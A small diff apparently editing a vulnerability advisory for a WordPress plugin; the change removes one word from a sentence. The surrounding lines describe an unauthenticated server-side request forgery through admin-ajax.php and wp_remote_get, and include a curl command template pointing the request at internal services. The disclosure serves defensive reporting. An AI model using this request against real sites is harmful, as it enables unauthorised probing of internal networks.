@@ -53,7 +53,7 @@ function fetch_image_url(){
 }
 ```
 
-To exploit this, any unauthenticated user just needs to perform a POST request to the `/wp-admin/admin-ajax.php` endpoint specifying the needed parameter to trigger the `wp_remote_get` function.
+To exploit this, any unauthenticated user needs to perform a POST request to the `/wp-admin/admin-ajax.php` endpoint specifying the needed parameter to trigger the `wp_remote_get` function.
 
 ```bash
 curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=fetch_image_url&image_url=<LOCAL_SERVICE_ON_THE_SERVER_OR_NETWORK>
